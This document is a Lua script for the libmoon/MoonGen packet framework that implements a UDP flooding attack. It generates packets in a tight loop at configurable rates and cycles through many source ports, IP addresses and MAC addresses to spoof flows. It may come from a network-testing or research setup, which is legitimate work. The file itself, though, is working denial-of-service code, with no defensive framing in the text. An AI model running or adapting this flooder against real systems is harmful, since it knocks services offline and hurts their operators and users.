--- A simple UDP flooding attack script
local libmoon = require "libmoon"
local log = require "log"
local memory = require "memory"
local stats = require "stats"
local arp = require "proto.arp"

local attack = require "attack"

local ffi = require "ffi"

-- the configure function is called on startup with a pre-initialized command line parser
function configure(parser)
	attack.configure_pars(parser)
	parser:description("UDP Flooding Attack.")

	parser:option("--pktLength", "Packet length of udp packets."):args(1):convert(tonumber):default(60)

	parser:option("--flows", "Number of flows used in the flood by using different source ports. 0 results in 65535 flows (max port count)."):args(1):convert(tonumber):default(1)
	parser:option("--ipFlows", "Number of flows used in the flood by using different source IP addresses. Max 255"):args(1):convert(tonumber):default(1)
	parser:option("--ethFlows", "Number of flows used in the flood by using different source ethernet addresses. Max 255"):args(1):convert(tonumber):default(1)

	return parser:parse()
end

function master(args)
	attack.main(args)
end

function txTask(threadId, queue, args)
	log:info("Started txTask.")
	local PKT_LEN = args.pktLength

	local captureCtr
	if args.outputTxStats then
			captureCtr = stats:newPktTxCounter("thread #" .. threadId, "CSV", args.outputTxStats .. threadId .. ".csv")
	end

	local slowRate = false
	local lastSent = 0
	if args.rate < 100 then
		slowRate = args.queueRate
	end

	local srcPortCounter
	local srcPortCounterMax
	if args.flows and not (args.flows == 1) then
		srcPortCounter = 0
		if args.flows == 0 then
			-- 65535 is the highest port used
			srcPortCounterMax = 65535
		else
			srcPortCounterMax = args.flows
		end
	end

	local srcIPCounter
	local srcIPCounterMax
	if args.ipFlows and not (args.ipFlows == 1) then
		srcIPCounter = 0
		if args.ipFlows == 0 then
			srcIPCounterMax = 255
		else
			srcIPCounterMax = args.ipFlows
		end
	end

	local srcETHCounter
	local srcETHCounterMax
	if args.ethFlows and not (args.ethFlows == 1) then
		srcETHCounter = 0
		if args.ethFlows == 0 then
			srcETHCounterMax = 255
		else
			srcETHCounterMax = args.ethFlows
		end
	end

	local mempool = memory.createMemPool()
	local bufs = mempool:bufArray()

	local udpPkt = createUDPPkt(args, mempool)

	attack.modifyPkt(udpPkt, args)

	attack.txTask_sync_start(args)

	while libmoon.running() do
		if slowRate then
			bufs:allocN(args.pktLength, 1)
		else
			bufs:alloc(args.pktLength)
		end
		local sizeSum = 0

		for i, buf in ipairs(bufs) do
			-- packet framework allows simple access to fields in complex protocol stacks
			local pkt = buf:getUdpPacket()

			-- similar to pkt:setRawPacket
			ffi.copy(pkt, udpPkt, 42)

			sizeSum = sizeSum + buf:getSize()
			
			if srcPortCounter then
				local srcPort = (pkt.udp:getSrcPort() + srcPortCounter  - 1) % 65535 + 1
				pkt.udp:setSrcPort(srcPort)
				srcPortCounter = (srcPortCounter + 1) % srcPortCounterMax
			end

			if srcIPCounter then
				pkt.ip4.src.uint8[3] = (pkt.ip4.src.uint8[3] + srcIPCounter)
				srcIPCounter = (srcIPCounter + 1) % srcIPCounterMax
			end

			if srcETHCounter then
				pkt.eth.src.uint8[5] = (pkt.eth.src.uint8[5] + srcETHCounter)
				srcETHCounter = (srcETHCounter + 1) % srcETHCounterMax
			end

			attack.txTask_setChecksumOffloading(buf, args)

			if captureCtr then
				captureCtr:countPacket(buf)
			end
		end

		if slowRate then
			local now = libmoon.getTime()
			local sizeBit = sizeSum * 8

			while (sizeBit / (now - lastSent)) > slowRate * 1000000 do
				now = libmoon.getTime()
			end
			lastSent = now
		end

		attack.txTask_send(queue, bufs)

		if captureCtr then
			captureCtr:update()
		end
	end
	
	if captureCtr then
		captureCtr:finalize()
	end

	log:info("Terminate txTask.")
end

rxTask = attack.rxTask


function createUDPPkt(args, mempool)
	local PKT_LEN = args.pktLength

	-- raw packet
	local res = ffi.new("uint8_t [?]", PKT_LEN)

	local bufArray = mempool:bufArray()

	bufArray:alloc(PKT_LEN, 1)

	local buf = bufArray[1]
	local pkt = buf:getUdpPacket()

	pkt:fill{
		-- fields not explicitly set here are initialized to reasonable defaults
		pktLength = args.pktLength
	}

	attack.modifyPkt(buf, args)

	-- similar to pkt:setRawPacket
	ffi.copy(res, pkt, PKT_LEN)

	bufArray:freeAll()

	return res
end